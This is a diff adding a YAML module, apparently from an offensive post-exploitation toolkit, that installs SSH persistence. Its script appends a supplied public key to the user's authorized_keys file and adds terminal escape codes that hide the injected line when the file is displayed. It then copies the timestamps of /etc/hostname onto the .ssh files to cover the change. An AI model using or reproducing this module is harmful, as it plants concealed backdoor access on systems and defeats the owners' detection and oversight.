@@ -1,0 +1,16 @@
+name: "authorized_keys injector"
+description: "Adds a key to authorized_keys"
+category: persistence
+need_root: false
+variables:
+  - name: ssh_public_key
+    description: "A public key to inject in authorized_keys"
+priority: 1000
+tip: "Public key '{{ssh_public_key}}' is injected to authorized_keys"
+script: |
+  mkdir -p ~/.ssh
+  printf '{{ssh_public_key}}\n\033[F\033[J' >> ~/.ssh/authorized_keys
+  chmod 700 ~/.ssh
+  chmod 600 ~/.ssh/authorized_keys
+  touch ~/.ssh -r /etc/hostname
+  touch ~/.ssh/authorized_keys -r /etc/hostname
